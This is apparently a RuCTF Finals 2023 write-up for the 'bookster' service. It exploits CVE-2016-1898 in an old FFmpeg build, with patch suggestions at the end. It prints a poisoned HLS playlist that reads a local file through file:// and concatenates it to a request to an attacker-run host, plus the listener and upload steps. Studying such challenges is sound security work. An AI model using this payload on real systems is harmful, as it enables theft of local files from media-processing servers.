# RuCTF Finals 2023 | bookster

## Description

This is a service for preserving books in arctic ice for future generations. 
Program like Github Arctic Code Vault.
Because in the future everyone likes to watch short videos, you need to attach a video to the book. 
A preview image will generated from the video using FFmpeg.

The flag is text in book files.

## Original vuln - SSRF


In the source used some custom build of ffmpeg `ffpegctf218.tar.gz` based on old version FFmpeg 2.1.8.

That is confirmed to be vulnerable to reading any files by sending that poisoned playlist instead of a video.

CVE-2016-1898. [Habr post from VK ](https://habr.com/ru/companies/vk/articles/274855/)



## Execution flow

- Run some simple `server.py` on your machine with external ip
- Put this external ip into some file. e.g. `static\header.m3u8` (NOTE: file must end with '?' not '\n')
```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:,
http://10.10.10.5:12345?
```
- Put this file to some public static files server. e.g run `python3 -m http.server 12322 --bind 0.0.0.0`
- Set link to this file and flag id in our bad video file e.g.`test.avi`
```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://10.10.10.5:12322/header.m3u8|file:///vault/books/{flag_id}.txt
#EXT-X-ENDLIST
```
- Now you must send POST request  `api/books`  for save new book from some account with our bad video file e.g. run `python send_payload.py`
- Now you have request with flag on your machine from step one

All steps in one [sploit](/sploits/bookster/bookster.1.sploit.py)

### Patch original

- Need to reverse our binary build
- use bindiff with original ffmpeg 2.1.8
- Understand how ffmpeg options was renamed 
- Find what hidden filter param apply to image. [This files was changed in source](/writeups/bookster/ffmpegchanges/cmd_utils.c) 
- Update to newer version of ffmpeg with original option names and filter param

### Patch alternative 

- Not save flags in file. Save it to database.
- Not use sqlite, rewrite service to postgres use.



